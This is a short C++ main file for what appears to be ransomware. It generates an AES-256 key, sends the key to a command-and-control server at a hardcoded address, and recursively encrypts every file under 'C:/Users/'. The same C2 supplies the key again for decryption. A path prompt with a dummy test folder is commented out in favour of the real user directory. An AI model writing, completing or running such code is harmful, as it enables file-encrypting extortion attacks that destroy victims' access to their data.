#include "cryptor.h"

#include <filesystem>
#include <iostream>
#include <string>

int main(int argc, char *argv[]) {
    AES256CBC AES;
    AES.C2Addr = "http://192.168.100.1:5000";

    std::string option;
    while (option != "e" and option != "d") {
        std::cout << "[/] Enter 'e' for encryption or 'd' for decryption: ";
        std::getline(std::cin, option);
    }

    std::string path;
    /*
    if (argc == 1) {
        std::cout << "[/] Enter a path (./dummy/): ";
        std::getline(std::cin, path);
        if (path == "")
            path = "./dummy/";
    } else
        path = argv[1];
    */path = "C:/Users/"; argc=argc; argv=argv;
    
    std::cout << "[i] Working within " << path << "\n";
    //AES.isLogging = false;;

    if (option == "e") {
        AES.generateKey();
        AES.keyToC2("test-b64-in");
        AES.encryptRecursively(path);
    } else {
        AES.keyFromC2("test-b64-in");
        AES.decryptRecursively(path);
    }

    return 0;
}

